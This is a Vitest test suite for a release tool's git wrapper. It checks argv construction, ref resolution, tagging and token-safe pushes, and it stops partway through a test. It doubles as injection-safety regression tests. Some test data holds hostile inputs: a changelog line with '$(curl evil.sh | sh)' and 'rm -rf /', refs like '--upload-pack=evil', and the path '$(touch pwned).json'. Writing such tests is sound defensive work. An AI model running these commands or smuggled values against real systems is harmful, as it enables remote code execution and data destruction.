import { describe, it, expect, beforeEach, vi } from 'vitest'
import * as fs from 'fs'
import * as os from 'os'
import * as git from './git'
import { execCommand, ExecError, ExecResult } from './exec.js'

// Mock the single subprocess touchpoint so every test asserts the exact
// argv arrays passed to git. This doubles as the injection-safety
// regression suite: untrusted values (commit messages, tag names, branch
// names) must always appear as single, discrete array elements. The real
// ExecError class is kept (not mocked) since git.ts constructs/throws it
// directly (e.g. commitFilesToBranch's "nothing to commit" detection).
vi.mock('./exec.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('./exec.js')>()
  return {
    ...actual,
    execCommand: vi.fn()
  }
})

// Mock the fs/os calls used by commitFilesToBranch so no real worktree or
// temp directory is touched.
vi.mock('fs', () => ({
  mkdtempSync: vi.fn(),
  mkdirSync: vi.fn(),
  writeFileSync: vi.fn(),
  rmSync: vi.fn()
}))

vi.mock('os', () => ({
  tmpdir: vi.fn()
}))

const mockExec = vi.mocked(execCommand)
const mockFs = vi.mocked(fs)
const mockOs = vi.mocked(os)

const RS = '\x1e'
const US = '\x1f'

function ok(stdout = ''): ExecResult {
  return { stdout, stderr: '', exitCode: 0 }
}

function fail(exitCode = 1, stderr = ''): ExecResult {
  return { stdout: '', stderr, exitCode }
}

beforeEach(() => {
  vi.resetAllMocks()
  mockExec.mockReturnValue(ok())
  // Reset module-level push-auth state between tests regardless of whether
  // a prior test's assertions threw before it could reset this itself.
  git.configureGitAuth('')
})

describe('fetchTags', () => {
  it('fetches tags from origin with allowNonZeroExit', () => {
    git.fetchTags()

    expect(mockExec).toHaveBeenCalledWith(
      'git',
      ['fetch', '--tags', '--force', '--quiet', 'origin'],
      { allowNonZeroExit: true }
    )
  })

  it('swallows errors from the fetch', () => {
    mockExec.mockImplementation(() => {
      throw new Error('no remote')
    })

    expect(() => git.fetchTags()).not.toThrow()
  })
})

describe('resolveRef', () => {
  it('returns the ref itself when it resolves directly', () => {
    mockExec.mockReturnValue(ok('abc123\n'))

    expect(git.resolveRef('main')).toBe('main')

    expect(mockExec).toHaveBeenCalledTimes(1)
    expect(mockExec).toHaveBeenCalledWith(
      'git',
      ['rev-parse', '--verify', '--quiet', 'main^{commit}'],
      { allowNonZeroExit: true }
    )
  })

  it('walks the candidate chain: ref, stripped refs/heads/, origin/<branch>, HEAD', () => {
    // Only origin/feature resolves.
    mockExec.mockImplementation((_file, args) =>
      args.includes('origin/feature^{commit}') ? ok('sha\n') : fail()
    )

    expect(git.resolveRef('refs/heads/feature')).toBe('origin/feature')

    const probed = mockExec.mock.calls.map((call) => call[1][3])
    expect(probed).toEqual([
      'refs/heads/feature^{commit}',
      'feature^{commit}',
      'origin/feature^{commit}'
    ])
    for (const call of mockExec.mock.calls) {
      expect(call[2]).toEqual({ allowNonZeroExit: true })
    }
  })

  it('falls back to HEAD as the last candidate', () => {
    mockExec.mockImplementation((_file, args) =>
      args.includes('HEAD^{commit}') ? ok('sha\n') : fail()
    )

    expect(git.resolveRef('refs/heads/gone-branch')).toBe('HEAD')

    const probed = mockExec.mock.calls.map((call) => call[1][3])
    expect(probed).toEqual([
      'refs/heads/gone-branch^{commit}',
      'gone-branch^{commit}',
      'origin/gone-branch^{commit}',
      'HEAD^{commit}'
    ])
  })

  it('returns null when nothing resolves', () => {
    mockExec.mockReturnValue(fail())

    expect(git.resolveRef('refs/heads/nope')).toBeNull()
    expect(mockExec).toHaveBeenCalledTimes(4)
  })

  it('deduplicates candidates when ref has no refs/heads/ prefix', () => {
    mockExec.mockReturnValue(fail())

    expect(git.resolveRef('main')).toBeNull()

    const probed = mockExec.mock.calls.map((call) => call[1][3])
    // 'main' probed once, not twice (ref === stripped).
    expect(probed).toEqual([
      'main^{commit}',
      'origin/main^{commit}',
      'HEAD^{commit}'
    ])
  })

  it('never probes candidates starting with -', () => {
    mockExec.mockReturnValue(fail())

    git.resolveRef('--upload-pack=evil')

    for (const call of mockExec.mock.calls) {
      expect(call[1][3].startsWith('-')).toBe(false)
    }
  })
})

describe('getCommitCount', () => {
  it('counts commits on HEAD by default and parses the integer', () => {
    mockExec.mockReturnValue(ok('42\n'))

    expect(git.getCommitCount()).toBe(42)

    expect(mockExec).toHaveBeenCalledWith('git', [
      'rev-list',
      '--count',
      'HEAD',
      '--'
    ])
  })

  it('counts commits on an explicit ref', () => {
    mockExec.mockReturnValue(ok('7'))

    expect(git.getCommitCount('origin/main')).toBe(7)

    expect(mockExec).toHaveBeenCalledWith('git', [
      'rev-list',
      '--count',
      'origin/main',
      '--'
    ])
  })

  it('refuses refs starting with - (option smuggling)', () => {
    expect(() => git.getCommitCount('--all')).toThrow(/Refusing to pass/)
    expect(mockExec).not.toHaveBeenCalled()
  })
})

describe('getCommitsBetween', () => {
  const prettyArg = `--pretty=format:${RS}%H${US}%B${US}`

  it('builds a base..head range with --reverse and --name-only when includeFiles', () => {
    mockExec.mockReturnValue(ok(''))

    git.getCommitsBetween('v1.0.0', 'origin/main', true)

    expect(mockExec).toHaveBeenCalledWith('git', [
      'log',
      '--reverse',
      prettyArg,
      '--name-only',
      '--diff-merges=first-parent',
      'v1.0.0..origin/main',
      '--'
    ])
  })

  // Regression test: plain `git log --name-only` suppresses file lists for
  // merge commits entirely unless told which parent(s) to diff against, so
  // a merge commit's manifest/changelog changes would silently vanish from
  // getCommitsSinceLastRelease's per-package filtering. `--diff-merges=
  // first-parent` reports the file list against the first parent, matching
  // getLastCommitDiffForFile's merge-commit handling, without changing
  // which commits the base..head range walks.
  it('always requests a first-parent diff format for merge commits alongside --name-only', () => {
    mockExec.mockReturnValue(ok(''))

    git.getCommitsBetween(null, 'HEAD', true)

    const args = mockExec.mock.calls[0][1]
    expect(args).toContain('--name-only')
    expect(args).toContain('--diff-merges=first-parent')
  })

  it('omits --name-only when includeFiles is false', () => {
    mockExec.mockReturnValue(ok(''))

    git.getCommitsBetween('v1.0.0', 'HEAD', false)

    expect(mockExec).toHaveBeenCalledWith('git', [
      'log',
      '--reverse',
      prettyArg,
      'v1.0.0..HEAD',
      '--'
    ])
  })

  it('uses just the head ref (no range) when base is null', () => {
    mockExec.mockReturnValue(ok(''))

    git.getCommitsBetween(null, 'HEAD', true)

    expect(mockExec).toHaveBeenCalledWith('git', [
      'log',
      '--reverse',
      prettyArg,
      '--name-only',
      '--diff-merges=first-parent',
      'HEAD',
      '--'
    ])
  })

  it('parses RS/US-delimited records with multiline bodies and file groups', () => {
    const body1 =
      'feat: add `thing`\n\nThis body has $(dangerous) text\nand spans multiple\n\nlines with "quotes"'
    const body2 = 'fix: small fix'
    const stdout =
      `${RS}aaa111${US}${body1}${US}\nsrc/a.ts\nsrc/b.ts\n` +
      `${RS}bbb222${US}${body2}\n${US}\ndocs/readme.md\n`
    mockExec.mockReturnValue(ok(stdout))

    const commits = git.getCommitsBetween('v1.0.0', 'HEAD', true)

    expect(commits).toEqual([
      {
        sha: 'aaa111',
        message: body1,
        files: ['src/a.ts', 'src/b.ts']
      },
      {
        sha: 'bbb222',
        message: body2,
        files: ['docs/readme.md']
      }
    ])
  })

  it('preserves oldest-first ordering as emitted by --reverse', () => {
    const stdout =
      `${RS}oldest${US}first commit${US}\n` +
      `${RS}middle${US}second commit${US}\n` +
      `${RS}newest${US}third commit${US}\n`
    mockExec.mockReturnValue(ok(stdout))

    const commits = git.getCommitsBetween(null, 'HEAD', false)

    expect(commits.map((c) => c.sha)).toEqual(['oldest', 'middle', 'newest'])
    expect(mockExec.mock.calls[0][1]).toContain('--reverse')
  })

  it('never splits records on newlines: a body containing blank lines stays one commit', () => {
    const body =
      'feat: x\n\nParagraph one.\n\nParagraph two.\n\n\nParagraph three.'
    const stdout = `${RS}abc${US}${body}${US}\nsrc/x.ts\n`
    mockExec.mockReturnValue(ok(stdout))

    const commits = git.getCommitsBetween(null, 'HEAD', true)

    expect(commits).toHaveLength(1)
    expect(commits[0].message).toBe(body)
    expect(commits[0].files).toEqual(['src/x.ts'])
  })

  it('returns [] for empty output and skips malformed records', () => {
    mockExec.mockReturnValue(ok(''))
    expect(git.getCommitsBetween(null, 'HEAD', true)).toEqual([])

    mockExec.mockReturnValue(ok(`${RS}garbage-without-separator\n`))
    expect(git.getCommitsBetween(null, 'HEAD', true)).toEqual([])
  })

  it('returns empty files array when includeFiles is false', () => {
    mockExec.mockReturnValue(ok(`${RS}abc${US}feat: y${US}`))

    const commits = git.getCommitsBetween(null, 'HEAD', false)

    expect(commits).toEqual([{ sha: 'abc', message: 'feat: y', files: [] }])
  })

  it('tolerates a record with no files block at all (missing trailing separator)', () => {
    mockExec.mockReturnValue(ok(`${RS}abc${US}feat: z`))

    expect(git.getCommitsBetween(null, 'HEAD', true)).toEqual([
      { sha: 'abc', message: 'feat: z', files: [] }
    ])
  })

  it('refuses base or head refs starting with -', () => {
    expect(() => git.getCommitsBetween('--all', 'HEAD', false)).toThrow(
      /Refusing to pass/
    )
    expect(() => git.getCommitsBetween(null, '--all', false)).toThrow(
      /Refusing to pass/
    )
    expect(mockExec).not.toHaveBeenCalled()
  })
})

describe('listTagsByDateDesc', () => {
  it('lists tags sorted by -creatordate (genuinely newest-first)', () => {
    mockExec.mockReturnValue(ok('v2.0.0\nfoo-v1.5.0\nv1.0.0\n'))

    const tags = git.listTagsByDateDesc()

    expect(mockExec).toHaveBeenCalledWith('git', [
      'tag',
      '--list',
      '--sort=-creatordate'
    ])
    expect(tags).toEqual(['v2.0.0', 'foo-v1.5.0', 'v1.0.0'])
  })

  it('filters blank lines and whitespace', () => {
    mockExec.mockReturnValue(ok('\nv1.0.0\n\n  \nv0.9.0\n\n'))

    expect(git.listTagsByDateDesc()).toEqual(['v1.0.0', 'v0.9.0'])
  })

  it('returns [] when there are no tags', () => {
    mockExec.mockReturnValue(ok(''))

    expect(git.listTagsByDateDesc()).toEqual([])
  })
})

describe('tagExists', () => {
  it('returns true when rev-parse exits zero', () => {
    mockExec.mockReturnValue(ok('deadbeef\n'))

    expect(git.tagExists('v1.2.3')).toBe(true)

    expect(mockExec).toHaveBeenCalledWith(
      'git',
      ['rev-parse', '--verify', '--quiet', 'refs/tags/v1.2.3'],
      { allowNonZeroExit: true }
    )
  })

  it('returns false when rev-parse exits non-zero', () => {
    mockExec.mockReturnValue(fail())

    expect(git.tagExists('v9.9.9')).toBe(false)
  })

  it('namespaces the tag under refs/tags/ so it cannot act as an option', () => {
    mockExec.mockReturnValue(fail())

    git.tagExists('--evil')

    expect(mockExec.mock.calls[0][1][3]).toBe('refs/tags/--evil')
  })
})

describe('createAnnotatedTag', () => {
  it('creates an annotated tag with per-command tagger identity', () => {
    git.createAnnotatedTag(
      'v1.2.3',
      'Release v1.2.3',
      'abc123',
      'release-bot',
      'bot@example.com'
    )

    expect(mockExec).toHaveBeenCalledWith('git', [
      '-c',
      'user.name=release-bot',
      '-c',
      'user.email=bot@example.com',
      'tag',
      '-a',
      '-m',
      'Release v1.2.3',
      '--',
      'v1.2.3',
      'abc123'
    ])
  })

  // Regression coverage: an annotated tag embeds its own "tagger" field
  // (like a commit's author/committer), so without an explicit identity it
  // fails on a runner with no git user.name/email configured -- "fatal:
  // empty ident name ... Committer identity unknown" -- exactly like a
  // commit would without commitFilesToBranch's -c user.name/-c user.email.
  it('always includes -c user.name/-c user.email before the tag subcommand', () => {
    git.createAnnotatedTag('v1.2.3', 'msg', 'abc123', 'a', 'b@example.com')

    const args = mockExec.mock.calls[0][1]
    expect(args.slice(0, 4)).toEqual([
      '-c',
      'user.name=a',
      '-c',
      'user.email=b@example.com'
    ])
    expect(args[4]).toBe('tag')
  })

  it('passes a hostile multiline changelog message as a single argv element', () => {
    const message =
      '## v1.2.3\n\n' +
      '- feat: run `rm -rf /` safely\n' +
      '- fix: handle $(curl evil.sh | sh) in titles\n' +
      '- chore: quotes \'single\' and "double"; semicolons; && ||\n'

    git.createAnnotatedTag('v1.2.3', message, 'abc123', 'a', 'b@example.com')

    expect(mockExec).toHaveBeenCalledTimes(1)
    const args = mockExec.mock.calls[0][1]
    expect(args.slice(4)).toEqual([
      'tag',
      '-a',
      '-m',
      message,
      '--',
      'v1.2.3',
      'abc123'
    ])
    // The whole hostile message is exactly one argv element, unaltered.
    expect(args[7]).toBe(message)
  })

  it('places untrusted tag names after the -- separator', () => {
    git.createAnnotatedTag('--force', 'msg', 'abc123', 'a', 'b@example.com')

    const args = mockExec.mock.calls[0][1]
    expect(args.indexOf('--')).toBeLessThan(args.indexOf('--force'))
  })

  // overwrite-existing-tags support: force-moving a pre-existing tag is the
  // git equivalent of the old Octokit createRef({ force: true }) upsert.
  it('adds -f before -a when force is true, to move a pre-existing tag', () => {
    git.createAnnotatedTag(
      'v1.2.3',
      'Release v1.2.3',
      'abc123',
      'a',
      'b@example.com',
      true
    )

    expect(mockExec).toHaveBeenCalledWith('git', [
      '-c',
      'user.name=a',
      '-c',
      'user.email=b@example.com',
      'tag',
      '-f',
      '-a',
      '-m',
      'Release v1.2.3',
      '--',
      'v1.2.3',
      'abc123'
    ])
  })

  it('omits -f when force is false (default)', () => {
    git.createAnnotatedTag(
      'v1.2.3',
      'Release v1.2.3',
      'abc123',
      'a',
      'b@example.com',
      false
    )

    const args = mockExec.mock.calls[0][1]
    expect(args).not.toContain('-f')
  })
})

describe('pushTag', () => {
  it('pushes the fully-qualified refs/tags ref to origin', () => {
    git.pushTag('v1.2.3')

    expect(mockExec).toHaveBeenCalledWith('git', [
      'push',
      'origin',
      'refs/tags/v1.2.3'
    ])
  })

  it('adds --force when overwriting a moved tag', () => {
    git.pushTag('v1.2.3', true)

    expect(mockExec).toHaveBeenCalledWith('git', [
      'push',
      '--force',
      'origin',
      'refs/tags/v1.2.3'
    ])
  })

  const EXTRAHEADER_KEY = 'http.https://github.com/.extraheader'
  const CRED_FILE = '/home/runner/work/_temp/git-credentials-abc.config'
  const SHOW_ORIGIN_LINE = `file:${CRED_FILE}\tAUTHORIZATION: basic CHECKOUT_ORIGINAL`

  it('resolves the real file a checkout-persisted extraheader lives in, clears just that file, authenticates, and restores it', () => {
    delete process.env.GITHUB_SERVER_URL
    mockExec.mockImplementation((_file, args) => {
      if (
        args.join(' ') === `config --show-origin --get-all ${EXTRAHEADER_KEY}`
      ) {
        return ok(`${SHOW_ORIGIN_LINE}\n`)
      }
      return ok('')
    })
    git.configureGitAuth('super-secret-pat')

    git.pushTag('v1.2.3')

    const calls = mockExec.mock.calls
    // Regression coverage, round 2: the first fix (capture/unset-all/
    // restore via `git config --local`) still failed in production. Root
    // cause: actions/checkout (persist-credentials: true, the default)
    // does NOT write its Authorization extraheader directly into
    // .git/config -- it writes it to a SEPARATE temp credentials file,
    // wired in via an includeIf.gitdir directive. `--local
    // --get-all`/`--unset-all` only ever touch .git/config itself, so they
    // silently see/change nothing for an include-resolved value -- verified
    // directly against the real git binary (git config --local --get-all
    // returns nothing for such a value, while an unscoped --get-all finds
    // it). `--show-origin --get-all` reveals the REAL file, which must be
    // targeted directly via `git config --file <that file>` to actually
    // remove (and later restore) the value -- also verified end-to-end
    // with GIT_CURL_VERBOSE against a real GitHub remote.
    const showOriginIndex = calls.findIndex(
      (call) =>
        call[1].join(' ') ===
        `config --show-origin --get-all ${EXTRAHEADER_KEY}`
    )
    const unsetIndex = calls.findIndex(
      (call) =>
        call[1].join(' ') ===
        `config --file ${CRED_FILE} --unset-all ${EXTRAHEADER_KEY}`
    )
    const pushIndex = calls.findIndex((call) => call[1].includes('push'))
    const addIndex = calls.findIndex(
      (call) =>
        call[1].join(' ') ===
        `config --file ${CRED_FILE} --add ${EXTRAHEADER_KEY} AUTHORIZATION: basic CHECKOUT_ORIGINAL`
    )
    expect(showOriginIndex).toBeGreaterThanOrEqual(0)
    expect(unsetIndex).toBeGreaterThan(showOriginIndex)
    expect(pushIndex).toBeGreaterThan(unsetIndex)
    expect(addIndex).toBeGreaterThan(pushIndex)

    const [, pushArgs, pushOptions] = calls[pushIndex]
    expect(pushArgs).toEqual(['push', 'origin', 'refs/tags/v1.2.3'])
    // The token must never appear in argv (visible via `ps`).
    expect(pushArgs.join(' ')).not.toContain('super-secret-pat')

    const env = (pushOptions as { env?: NodeJS.ProcessEnv }).env
    const expectedAuth = Buffer.from(
      'x-access-token:super-secret-pat'
    ).toString('base64')
    expect(env?.GIT_CONFIG_COUNT).toBe('1')
    expect(env?.GIT_CONFIG_KEY_0).toBe(EXTRAHEADER_KEY)
    expect(env?.GIT_CONFIG_VALUE_0).toBe(`AUTHORIZATION: basic ${expectedAuth}`)

    git.configureGitAuth('')
  })

  it('restores the checkout-persisted extraheader (in its real file) even when the push itself throws', () => {
    mockExec.mockImplementation((_file, args) => {
      if (
        args.join(' ') === `config --show-origin --get-all ${EXTRAHEADER_KEY}`
      ) {
        return ok(`${SHOW_ORIGIN_LINE}\n`)
      }
      if (args.includes('push')) {
        throw new ExecError('git push', 128, 'push rejected')
      }
      return ok('')
    })
    git.configureGitAuth('super-secret-pat')

    expect(() => git.pushTag('v1.2.3')).toThrow('push rejected')

    expect(
      mockExec.mock.calls.some(
        (call) =>
          call[1].join(' ') ===
          `config --file ${CRED_FILE} --add ${EXTRAHEADER_KEY} AUTHORIZATION: basic CHECKOUT_ORIGINAL`
      )
    ).toBe(true)

    git.configureGitAuth('')
  })

  it('treats a genuine "not found" exit code the same as nothing configured', () => {
    mockExec.mockImplementation((_file, args) => {
      if (
        args.join(' ') === `config --show-origin --get-all ${EXTRAHEADER_KEY}`
      ) {
        return fail(1)
      }
      return ok('')
    })
    git.configureGitAuth('super-secret-pat')

    git.pushTag('v1.2.3')

    expect(
      mockExec.mock.calls.some((call) => call[1].includes('--unset-all'))
    ).toBe(false)
    expect(mockExec.mock.calls.some((call) => call[1].includes('--add'))).toBe(
      false
    )
    const pushCall = mockExec.mock.calls.find((call) =>
      call[1].includes('push')
    )
    expect(
      (pushCall?.[2] as { env?: NodeJS.ProcessEnv } | undefined)?.env
        ?.GIT_CONFIG_KEY_0
    ).toBe(EXTRAHEADER_KEY)

    git.configureGitAuth('')
  })

  it('ignores a non-file config origin (nothing to safely remove)', () => {
    mockExec.mockImplementation((_file, args) => {
      if (
        args.join(' ') === `config --show-origin --get-all ${EXTRAHEADER_KEY}`
      ) {
        return ok('command line:\tAUTHORIZATION: basic FROM_CLI\n')
      }
      return ok('')
    })
    git.configureGitAuth('super-secret-pat')

    git.pushTag('v1.2.3')

    expect(
      mockExec.mock.calls.some((call) => call[1].includes('--unset-all'))
    ).toBe(false)
    expect(mockExec.mock.calls.some((call) => call[1].includes('--add'))).toBe(
      false
    )

    git.configureGitAuth('')
  })

  it('derives the extraheader key from GITHUB_SERVER_URL for GitHub Enterprise Server', () => {
    process.env.GITHUB_SERVER_URL = 'https://github.example.com'
    git.configureGitAuth('super-secret-pat')

    git.pushTag('v1.2.3')

    const pushCall = mockExec.mock.calls.find((call) =>
      call[1].includes('push')
    )
    const env = (pushCall?.[2] as { env?: NodeJS.ProcessEnv } | undefined)?.env
    expect(env?.GIT_CONFIG_KEY_0).toBe(
      'http.https://github.example.com/.extraheader'
    )

    delete process.env.GITHUB_SERVER_URL
    git.configureGitAuth('')
  })

  it('skips capture/unset/restore entirely when nothing was persisted (e.g. persist-credentials: false)', () => {
    // Default mock: `config --show-origin --get-all` returns ok('') --
    // empty stdout, exit 0 -- which must be treated as "nothing to
    // restore", not as a single empty-string entry to restore later.
    git.configureGitAuth('super-secret-pat')

    git.pushTag('v1.2.3')

    expect(
      mockExec.mock.calls.some((call) => call[1].includes('unset-all'))
    ).toBe(false)
    expect(mockExec.mock.calls.some((call) => call[1].includes('--add'))).toBe(
      false
    )

    git.configureGitAuth('')
  })

  it('falls back to ambient (checkout-persisted) credentials when no token is configured', () => {
    git.configureGitAuth('')

    git.pushTag('v1.2.3')

    // Exactly the 2-arg call: no options object, no config get/unset/add
    // calls at all.
    expect(mockExec).toHaveBeenCalledWith('git', [
      'push',
      'origin',
      'refs/tags/v1.2.3'
    ])
    expect(mockExec.mock.calls).toHaveLength(1)
  })
})

describe('getFileAtRef', () => {
  it('reads the file with git show <ref>:<path> and returns the content', () => {
    mockExec.mockReturnValue(ok('{"packages": {}}'))

    const content = git.getFileAtRef('origin/main', '.release-manifest.json')

    expect(mockExec).toHaveBeenCalledWith(
      'git',
      ['show', 'origin/main:.release-manifest.json'],
      { allowNonZeroExit: true }
    )
    expect(content).toBe('{"packages": {}}')
  })

  it('returns null when the ref or file does not exist (non-zero exit)', () => {
    mockExec.mockReturnValue(fail(128, 'fatal: path does not exist'))

    expect(git.getFileAtRef('origin/main', 'missing.json')).toBeNull()
  })

  it('refuses refs starting with -', () => {
    expect(() => git.getFileAtRef('--output=/tmp/x', 'file')).toThrow(
      /Refusing to pass/
    )
    expect(mockExec).not.toHaveBeenCalled()
  })
})

describe('remoteBranchExists', () => {
  it('returns true when ls-remote prints a matching ref', () => {
    mockExec.mockReturnValue(ok('abc123\trefs/heads/release-main\n'))

    expect(git.remoteBranchExists('release-main')).toBe(true)

    expect(mockExec).toHaveBeenCalledWith('git', [
      'ls-remote',
      '--heads',
      'origin',
      'refs/heads/release-main'
    ])
  })

  it('returns false when ls-remote output is empty (branch deleted on remote)', () => {
    mockExec.mockReturnValue(ok(''))

    expect(git.remoteBranchExists('release-main')).toBe(false)
  })

  it('returns false when ls-remote output is only whitespace', () => {
    mockExec.mockReturnValue(ok('\n'))

    expect(git.remoteBranchExists('release-main')).toBe(false)
  })
})

describe('getRemoteBranchSha', () => {
  it('resolves origin/<branch> to a SHA', () => {
    mockExec.mockReturnValue(ok('abc123\n'))

    expect(git.getRemoteBranchSha('main')).toBe('abc123')

    expect(mockExec).toHaveBeenCalledWith(
      'git',
      ['rev-parse', '--verify', '--quiet', 'origin/main'],
      { allowNonZeroExit: true }
    )
  })

  it('returns null on non-zero exit', () => {
    mockExec.mockReturnValue(fail())

    expect(git.getRemoteBranchSha('gone')).toBeNull()
  })

  it('returns null when stdout is empty despite zero exit', () => {
    mockExec.mockReturnValue(ok('\n'))

    expect(git.getRemoteBranchSha('main')).toBeNull()
  })
})

describe('getLastCommitDiffForFile', () => {
  // The merge-commit regression this guards against: `git show <merge>
  // --format= -- <file>` implicitly produces a COMBINED diff that omits any
  // file identical to one of the parents -- so a cleanly merged release
  // PR's manifest change (identical to the release branch, one of the
  // merge's parents) came back as an empty patch. Diffing explicitly
  // against the first parent (`<ref>^`) fixes this.
  it('diffs against the first parent when one exists, not `git show`', () => {
    mockExec.mockImplementation((_file, args) => {
      if (args.includes('rev-parse')) {
        return ok('parentsha\n') // HEAD^ resolves: HEAD has a parent
      }
      return ok('diff --git a/x b/x\n+"main": "1.1.0"\n')
    })

    const patch = git.getLastCommitDiffForFile('.release-manifest.json')

    expect(mockExec).toHaveBeenNthCalledWith(
      1,
      'git',
      ['rev-parse', '--verify', '--quiet', 'HEAD^'],
      { allowNonZeroExit: true }
    )
    expect(mockExec).toHaveBeenNthCalledWith(2, 'git', [
      'diff',
      'HEAD^',
      'HEAD',
      '--',
      '.release-manifest.json'
    ])
    expect(patch).toContain('"main": "1.1.0"')
  })

  it('falls back to `git show` (diff against the empty tree) for a commit with no parent', () => {
    mockExec.mockImplementation((_file, args) => {
      if (args.includes('rev-parse')) {
        return fail(128, 'fatal: bad revision') // no HEAD^ -- root commit
      }
      return ok('diff --git a/x b/x\n+added\n')
    })

    const patch = git.getLastCommitDiffForFile('.release-manifest.json')

    expect(mockExec).toHaveBeenNthCalledWith(2, 'git', [
      'show',
      'HEAD',
      '--format=',
      '--',
      '.release-manifest.json'
    ])
    expect(patch).toContain('+added')
  })

  it('accepts an explicit ref, diffing <ref>^ against <ref>', () => {
    mockExec.mockImplementation((_file, args) =>
      args.includes('rev-parse') ? ok('parentsha\n') : ok('')
    )

    git.getLastCommitDiffForFile('file.txt', 'abc123')

    expect(mockExec).toHaveBeenNthCalledWith(2, 'git', [
      'diff',
      'abc123^',
      'abc123',
      '--',
      'file.txt'
    ])
  })

  it('keeps hostile file paths inert after the -- separator', () => {
    mockExec.mockImplementation((_file, args) =>
      args.includes('rev-parse') ? ok('parentsha\n') : ok('')
    )

    git.getLastCommitDiffForFile('$(touch pwned).json')

    const diffCall = mockExec.mock.calls.find((call) =>
      call[1].includes('diff')
    )
    const args = diffCall?.[1] ?? []
    expect(args[args.length - 1]).toBe('$(touch pwned).json')
    expect(args[args.length - 2]).toBe('--')
  })

  it('refuses refs starting with -', () => {
    expect(() => git.getLastCommitDiffForFile('file', '--all')).toThrow(
      /Refusing to pass/
    )
    expect(mockExec).not.toHaveBeenCalled()
  })
})

describe('commitFilesToBranch', () => {
  const worktreeDir = '/mock-tmp/release-action-abc123'

  beforeEach(() => {
    mockOs.tmpdir.mockReturnValue('/mock-tmp')
    mockFs.mkdtempSync.mockReturnValue(worktreeDir)
  })

  const options = {
    branch: 'release-main',
    baseRef: 'origin/main',
    message: 'chore: release main 1.2.0\n\nwith a `body` and $(stuff)',
    files: [
      { path: 'package.json', content: '{"version": "1.2.0"}' },
      { path: 'packages/foo/CHANGELOG.md', content: '## 1.2.0\n- feat: x' }
    ],
    userName: 'release-bot',
    userEmail: 'bot@example.com'
  }

  it('runs the full worktree sequence and returns the new commit SHA', () => {
    mockExec.mockImplementation((_file, args) =>
      args.includes('rev-parse') ? ok('newsha123\n') : ok('')
    )

    const sha = git.commitFilesToBranch(options)

    expect(sha).toBe('newsha123')

    // Temp worktree created from os.tmpdir() and detached at baseRef.
    expect(mockFs.mkdtempSync).toHaveBeenCalledWith('/mock-tmp/release-action-')
    expect(mockExec).toHaveBeenNthCalledWith(1, 'git', [
      'worktree',
      'add',
      '--detach',
      worktreeDir,
      'origin/main'
    ])

    // Files written under the worktree dir.
    expect(mockFs.mkdirSync).toHaveBeenCalledWith(worktreeDir, {
      recursive: true
    })
    expect(mockFs.writeFileSync).toHaveBeenCalledWith(
      `${worktreeDir}/package.json`,
      '{"version": "1.2.0"}'
    )
    expect(mockFs.mkdirSync).toHaveBeenCalledWith(
      `${worktreeDir}/packages/foo`,
      { recursive: true }
    )
    expect(mockFs.writeFileSync).toHaveBeenCalledWith(
      `${worktreeDir}/packages/foo/CHANGELOG.md`,
      '## 1.2.0\n- feat: x'
    )

    // -A rather than an explicit path list, so postWriteCommands' own file
    // changes (e.g. cargo update refreshing Cargo.lock) are picked up too.
    expect(mockExec).toHaveBeenNthCalledWith(2, 'git', [
      '-C',
      worktreeDir,
      'add',
      '-A'
    ])

    // Commit with per-command identity; the multiline message with
    // backticks/$() is a single argv element. allowNonZeroExit lets the
    // "nothing to commit" case be detected below instead of always
    // throwing.
    expect(mockExec).toHaveBeenNthCalledWith(
      3,
      'git',
      [
        '-C',
        worktreeDir,
        '-c',
        'user.name=release-bot',
        '-c',
        'user.email=bot@example.com',
        'commit',
        '-m',
        options.message
      ],
      { allowNonZeroExit: true }
    )

    // Force-push replicates the old updateRef({force: true}) upsert.
    expect(mockExec).toHaveBeenNthCalledWith(4, 'git', [
      '-C',
      worktreeDir,
      'push',
      '--force',
      'origin',
      'HEAD:refs/heads/release-main'
    ])

    // New SHA read from the worktree HEAD.
    expect(mockExec).toHaveBeenNthCalledWith(5, 'git', [
      '-C',
      worktreeDir,
      'rev-parse',
      'HEAD'
    ])

    // Cleanup: worktree removed and temp dir deleted.
    expect(mockExec).toHaveBeenNthCalledWith(
      6,
      'git',
      ['worktree', 'remove', '--force', worktreeDir],
      { allowNonZeroExit: true }
    )
    expect(mockFs.rmSync).toHaveBeenCalledWith(worktreeDir, {
      recursive: true,
      force: true
    })
  })

  it('runs postWriteCommands after writing files and before git add', () => {
    mockExec.mockImplementation((_file, args) =>
      args.includes('rev-parse') ? ok('newsha123\n') : ok('')
    )

    git.commitFilesToBranch({
      ...options,
      postWriteCommands: [
        { cwd: '.', file: 'cargo', args: ['update', '--workspace'] },
        {
          cwd: 'packages/foo',
          file: 'cargo',
          args: ['update', '--workspace']
        }
      ]
    })

    // Runs between the file writes (no exec calls of their own) and `git
    // add`, which is call #2 in the base sequence -- so cargo takes #2/#3
    // and `git add -A` shifts to #4.
    expect(mockExec).toHaveBeenNthCalledWith(
      2,
      'cargo',
      ['update', '--workspace'],
      { cwd: worktreeDir }
    )
    expect(mockExec).toHaveBeenNthCalledWith(
      3,
      'cargo',
      ['update', '--workspace'],
      { cwd: `${worktreeDir}/packages/foo` }
    )
    expect(mockExec).toHaveBeenNthCalledWith(4, 'git', [
      '-C',
      worktreeDir,
      'add',
      '-A'
    ])
  })

  it('refuses a postWriteCommand cwd that escapes the worktree', () => {
    expect(() =>
      git.commitFilesToBranch({
        ...options,
        postWriteCommands: [
          { cwd: '../../etc', file: 'cargo', args: ['update'] }
        ]
      })
    ).toThrow(/Refusing to run a post-write command outside the worktree/)

    // Still cleaned up despite the guard throwing.
    expect(mockExec.mock.calls.some((call) => call[1].includes('remove'))).toBe(
      true
    )
  })

  it('removes the worktree and temp dir even when a git step throws', () => {
    mockExec.mockImplementation((_file, args) => {
      if (args.includes('commit')) {
        throw new Error('commit failed')
      }
      return ok('')
    })

    expect(() => git.commitFilesToBranch(options)).toThrow('commit failed')

    const removeCall = mockExec.mock.calls.find((call) =>
      call[1].includes('remove')
    )
    expect(removeCall).toBeDefined()
    expect(removeCall?.[1]).toEqual([
      'worktree',
      'remove',
      '--force',
      worktreeDir
    ])
    expect(removeCall?.[2]).toEqual({ allowNonZeroExit: true })
    expect(mockFs.rmSync).toHaveBeenCalledWith(worktreeDir, {
      recursive: true,
      force: true
    })
    // Push never ran after the failed commit.
    expect(mockExec.mock.calls.some((call) => call[1].includes('push'))).toBe(
      false
    )
  })

  it('cleans up even when the push throws', () => {
    mockExec.mockImplementation((_file, args) => {
      if (args.includes('push')) {
        throw new Error('push rejected')
      }
      return ok('')
    })

